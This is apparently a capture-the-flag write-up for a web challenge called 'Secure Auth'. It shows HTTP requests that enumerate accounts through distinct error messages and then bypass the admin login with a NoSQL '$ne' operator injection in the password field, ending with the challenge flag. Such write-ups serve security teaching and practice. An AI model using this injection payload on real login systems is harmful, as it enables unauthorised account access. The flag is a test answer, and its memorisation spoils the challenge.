# PatriotCTF 2025 - Secure Auth
## Category: Web
### Author: iamncloud9

---

### Exploitation
<img width="828" height="960" alt="image" src="https://github.com/user-attachments/assets/4f4c9626-458a-44ec-a96b-f47f3cffb9ac" />

- Use the provided API to send requests:
```
POST /api/authenticate HTTP/1.1

...

Content-Type: application/json

...

{
  "username": "guest",
  "password": "guest123",
  "remember": "True"
}

-----------------------------------------------------------------------------------------
Response:

{"flag":null,"message":"Authentication successful","role":"guest","success":true,"user":"guest"}
```

- This API returns specific responses instead of “Invalid credential” like the /logic endpoint, so it allows credential enumeration:
```
POST /api/authenticate HTTP/1.1
...

Content-Type: application/json

...

{
  "username": "admin",
  "password": "123",
  "remember": "False"
}

-----------------------------------------------------------------------------------------
Response:

{"message":"Invalid password","success":false}
```

- Data is sent in JSON format → Could indicate NoSQL
- Exploit & Get Flag:
```
POST /api/authenticate HTTP/1.1

...

Content-Type: application/json

...

{
  "username": "admin",
  "password": {
			"$ne":"123"
	},
  "remember": "False"
}

------------------------------------------------------------------------------------------
Response:
{
  "flag":"FLAG{py7h0n_typ3_c03rc10n_byp4ss}",
  "message":"Authentication successful",
  "role":"admin",
  "success":true,
  "user":"admin"
}

```

---

### Result
```
FLAG{py7h0n_typ3_c03rc10n_byp4ss}
```
